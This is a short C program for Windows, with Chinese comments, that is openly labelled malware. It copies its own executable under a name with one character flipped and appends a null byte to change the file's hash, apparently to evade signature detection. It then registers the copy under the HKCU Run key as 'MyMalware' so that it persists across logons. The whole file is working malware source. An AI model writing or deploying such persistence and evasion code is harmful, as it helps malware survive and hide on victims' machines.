#include <windows.h>
#include <strsafe.h>
#include <stdio.h>

void mutateExecutable() {
    wchar_t oldExecutablePath[MAX_PATH];
    wchar_t newExecutablePath[MAX_PATH];
    size_t executablePathLength;

    // 获取当前执行文件的路径
    GetModuleFileName(NULL, oldExecutablePath, MAX_PATH);
    StringCchCopy(newExecutablePath, MAX_PATH, oldExecutablePath);
    StringCchLengthW(oldExecutablePath, MAX_PATH, &executablePathLength);

    // 更改文件名的最后一个字符
    wchar_t mutatingChar = newExecutablePath[executablePathLength - 5];
    newExecutablePath[executablePathLength - 5] = mutatingChar / 2 * 2 + !(mutatingChar % 2);

    // 复制文件并更改副本
    CopyFile(oldExecutablePath, newExecutablePath, FALSE);
    HANDLE hFile = CreateFile(newExecutablePath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        SetFilePointer(hFile, 0, NULL, FILE_END);
        char toWrite[] = "\0";
        WriteFile(hFile, toWrite, 1, &bytesWritten, NULL);
        CloseHandle(hFile);
    }

    // 确保下次运行的是 newExecutablePath - 修改注册表持久化条目
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, L"MyMalware", 0, REG_SZ, (BYTE*)newExecutablePath, (lstrlen(newExecutablePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    printf("Executable mutated and copied to: %ls\n", newExecutablePath);
}

int main() {
    mutateExecutable();
    return 0;
}
